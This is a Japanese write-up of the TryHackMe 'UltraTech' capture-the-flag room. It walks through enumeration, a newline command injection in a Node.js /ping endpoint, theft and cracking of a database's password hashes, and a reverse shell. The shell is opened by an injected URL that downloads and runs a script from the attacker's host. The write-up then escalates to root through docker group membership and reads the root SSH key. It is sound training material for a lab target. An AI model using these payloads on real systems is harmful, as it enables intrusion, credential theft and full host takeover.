# Ultra Tech CTF

https://tryhackme.com/room/ultratech1

## Enumeration

```shell
TARGET=10.201.50.71
sudo bash -c "echo $TARGET   ultratech.thm >> /etc/hosts"
```

### ポートスキャン

```sh
root@ip-10-201-6-27:~# nmap -sS -p- $TARGET

PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
8081/tcp  open  blackice-icecap
31331/tcp open  unknown
```

```sh
nmap -sV -p21,22,8081,31331 $TARGET

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

### ディレクトリ列挙

2つのエンドポイントを発見。

```sh
dirb http://$TARGET:8081

---- Scanning URL: http://10.201.50.71:8081/ ----
+ http://10.201.50.71:8081/auth (CODE:200|SIZE:39)                                                                                                                      
+ http://10.201.50.71:8081/ping (CODE:500|SIZE:1094) 
```

### /auth

login, password パラメータを指定することが分かる。

```
You must specify a login and a password
```

### /ping

コールスタックが露出している。

```
TypeError: Cannot read property 'replace' of undefined
    at app.get (/home/www/api/index.js:45:29)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/www/api/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/www/api/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at /home/www/api/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/www/api/node_modules/express/lib/router/index.js:335:12)
    at next (/home/www/api/node_modules/express/lib/router/index.js:275:10)
    at cors (/home/www/api/node_modules/cors/lib/index.js:188:7)
    at /home/www/api/node_modules/cors/lib/index.js:224:17
```

## データベース

問題文からデータベースファイルが存在することが分かる。  
ヒントから、カギはpingのエラー内容と思われる。

pingなのでおそらくIPアドレスなどがパラメータとして必要で、それがundefinedなので replace 呼び出しによりエラーが出ているのではないかと想定。

```js
addr.replace('from','to');
```

URLパラメータかJSONか分からないが、まずURLパラメータをファジングする。

```sh
$ ffuf -u 'http://ultratech.thm:8081/ping?FUZZ=10.11.146.32' -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fc 500         

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://ultratech.thm:8081/ping?FUZZ=10.11.146.32
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 500
________________________________________________

ip                      [Status: 200, Size: 267, Words: 31, Lines: 7, Duration: 810ms]
:: Progress: [6453/6453] :: Job [1/1] :: 108 req/sec :: Duration: [0:00:59] :: Errors: 0 ::
```

URLパラメータとして ip を渡せばよいことが分かった。

http://ultratech.thm:8081/ping?ip=10.11.146.32;id でコマンドインジェクションを試すと、次のエラー。replaceでセミコロンを削除されていると思われる。

```
ping: 10.11.146.32id: Name or service not known
```

いろいろ試した結果、`http://ultratech.thm:8081/ping?ip=10.11.146.32%0Aid` のように %0A を使うと成功した。

```
PING 10.11.146.32 (10.11.146.32) 56(84) bytes of data. 64 bytes from 10.11.146.32: icmp_seq=1 ttl=61 time=383 ms --- 10.11.146.32 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 383.190/383.190/383.190/0.000 ms uid=1002(www) gid=1002(www) groups=1002(www)`
```

ls -al でDBファイル名判明。

```
PING 10.11.146.32 (10.11.146.32) 56(84) bytes of data. 64 bytes from 10.11.146.32: icmp_seq=1 ttl=61 time=410 ms --- 10.11.146.32 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 410.536/410.536/410.536/0.000 ms total 76 drwxr-xr-x 3 www www 4096 Mar 22 2019 . drwxr-xr-x 5 www www 4096 Mar 22 2019 .. -rw-r--r-- 1 www www 1750 Mar 22 2019 index.js drwxrwxr-x 163 www www 4096 Mar 22 2019 node_modules -rw-r--r-- 1 www www 370 Mar 22 2019 package.json -rw-r--r-- 1 www www 42702 Mar 22 2019 package-lock.json -rw-rw-r-- 1 www www 103 Mar 22 2019 start.sh -rw-r--r-- 1 www www 8192 Mar 22 2019 [REDACTED]
```

base64コマンドを使ってDBファイルを出力し、kali上でデコードして復元。

```sh
$ file ./[REDACTED]
./utech.db.sqlite: SQLite 3.x database, last written using SQLite version 3026000, file counter 3, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 3
```

sqliteブラウザで開き、2ユーザーのパスワードハッシュを取得。どちらも hashcatでクラックできた。

## リバースシェル

shell.sh をHTTPホストし、実行する。

`http://ultratech.thm:8081/ping?ip=10.11.146.32%0Awget%20http://10.11.146.32:8000/shell.sh%0Achmod%20777%20shell.sh%0A./shell.sh`

```sh
$ nc -nlvp 8888 
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.50.71] 57348
sh: 0: can't access tty; job control turned off
$ id
uid=1002(www) gid=1002(www) groups=1002(www)
```

クラックしたパスワードを使い、r00t ユーザーになれる。

## 権限昇格

dockerグループに入っている。

```sh
r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

イメージ一覧でbash というイメージを発見し、それを利用してエスケープ。

```sh
r00t@ultratech-prod:~$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        6 years ago         15.8MB

r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

/root のプライベートメモ。

```sh
# cat /root/private.txt
# Life and acomplishments of Alvaro Squalo - Tome I

Memoirs of the most successful digital nomdad finblocktech entrepreneur
in the world.

By himself.

## Chapter 1 - How I became successful
```

シークレットSSHキー。

```sh
# cat /root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
[REDACTED]
```

## 振り返り

- パラメータの発見からコマンドインジェクションは、問題文の誘導のおかげもあったが筋道立った思考ができて良かった。
- 権限昇格については、dockerっぽくない環境だったのでなかなか気づきにくかった。
